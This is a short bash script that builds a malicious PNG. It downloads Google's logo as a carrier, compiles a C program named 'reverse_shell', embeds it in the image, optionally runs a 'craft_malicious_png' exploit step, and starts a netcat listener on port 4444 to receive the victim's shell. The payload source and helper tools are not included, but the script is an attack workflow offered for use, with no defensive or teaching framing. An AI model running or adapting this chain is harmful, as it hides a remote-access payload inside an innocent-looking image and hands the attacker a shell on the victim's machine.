#!/bin/bash

# --- Configuration ---
# 1. Provide a real URL to a PNG file
IMAGE_URL="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
IMAGE="benign.png"
OUTPUT="malicious.png"
PAYLOAD="reverse_shell"
PORT="4444"

# --- Execution ---

# Download the benign image
echo "[*] Downloading the base image..."
wget "$IMAGE_URL" -O "$IMAGE"

# Create the payload (Compiles your C code)
echo "[*] Compiling the C payload..."
gcc "$PAYLOAD.c" -o "$PAYLOAD"

# Embed the payload into the image
# This uses the 'embed_payload' program we built earlier
echo "[*] Embedding payload into image..."
./embed_payload "$IMAGE" "$OUTPUT" "$PAYLOAD"

# Craft the malicious PNG 
# Note: If you don't have this specific exploit program, comment it out
if [ -f "./craft_malicious_png" ]; then
    echo "[*] Crafting exploit..."
    ./craft_malicious_png "$OUTPUT" "$PAYLOAD"
else
    echo "[!] Skipping craft_malicious_png (file not found)"
fi

# Start the listener
echo "[*] Opening listener on port $PORT..."
nc -lvnp "$PORT"